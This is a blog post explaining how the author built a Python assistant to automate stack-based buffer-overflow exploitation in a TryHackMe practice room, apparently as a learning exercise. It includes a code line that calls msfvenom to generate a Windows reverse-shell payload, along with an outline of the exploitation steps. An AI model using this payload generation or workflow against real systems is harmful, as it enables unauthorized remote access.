# :game_die: Automation of Buffer-Overflow

---

# Automation of Buffer-Overflow

## Code Explanation of my Stack-Based Buffer-Overflow Assitant Program in Python

In this article, I am not teaching about Buffer-Overflow or not showing the demonstration of my Buffer-Overflow Assitant program written in python. I am going to talk about How I created this program.

## How I got an Idea for this Project?

I was doing [TryHackme Room on Buffer-Overflow](https://tryhackme.com/room/bufferoverflowprep). Where I have to solve the 10 tasks on it.

I did the first task manually by understanding each step to do stack-based buffer overflow exploitation. Thanks to for this room and his [repository about buffer overflow](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst). After getting a good hold on the steps, I thought to complete the remaining 9 tasks with my Buffer-Overflow Assistant so I gave time to create it.

>

It’s better to give 4 hours creating or learning new things than to do 2 hours of repetitive tasks.

## Code Explanation

I reused the Fuzzing and Exploit Code from [Tib3rius](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst) in my Program and then First worked on the color scheme and simple intro of the program. After that, I used pyperclip module in order to automatically copy the mona commands for the user so that they can be directly pasted.

## Get Pak Cyberbot’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

I used different color schemes for the different tasks so that eyes can catch them quickly.

*GREEN : Text that is copied automatically to your Clipboard*

*BLUE : Takes Input from the User*

*RED : Alerts the User to Restart the Vulnerable Application in Immunity Debugger before going further*

I also used os.popen() in order to generate the payloads from Metasploit by the program and use it in the code itself.

*Bofy using pattern_create ruby script*

*Bofy using msfvenom to generate a payload*

When MsfVenom generates the payload, It gives some extra characters as the output that are not intended for the payload. So I used grep and tr Linux command to filter out only hex data.

```
# filter out the payload using grep and trpayload = os.popen(f"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\" -f c | grep -oe '\"[\\\\0-9a-z]*\"' | tr -d '\"' | tr -d \"\\n\"").read()
```

Whenever a python program takes input from stdin, it escapes \ characters which means:

```
payload = input('Value in hex : ') #Value in hex : \x63
# payload = '\\x61' whereas I have to give same as the input sopayload = payload.encode('utf-8').decode('unicode_escape')
# payload = '\x61' hex in 61 is 'a' in ascii
```

Exploit() method simple summary:

- To find EIP offset (*payload = Generated_Pattern*)

- To test the EIP offset (*offset = <offset of EIP> & retn = ‘BBBB’*)

- To find the BadChars (*payload = byte_array*)

- To find the Jump Point(*retn = Jump_Point_Address*)

- Exploitation(*payload = msfvenom_payload*)

## (*Updated*) Result Of My Program:

After completing the program, I used it to solve the remaining 9 tasks. It took only 15 mins to complete the 9 tasks.😎

*Note: *I didn’t write the code to verify the bad chars removal. This program might have some bugs and hasn’t many features yet. You can report the bug on my [GitHub](https://github.com/PakCyberbot) and collaboration is appreciated.

For more informative material, You can follow me on:

I hope you learned something new from this article. Feedback or Constructive Criticism is appreciated in the comment section below!

---
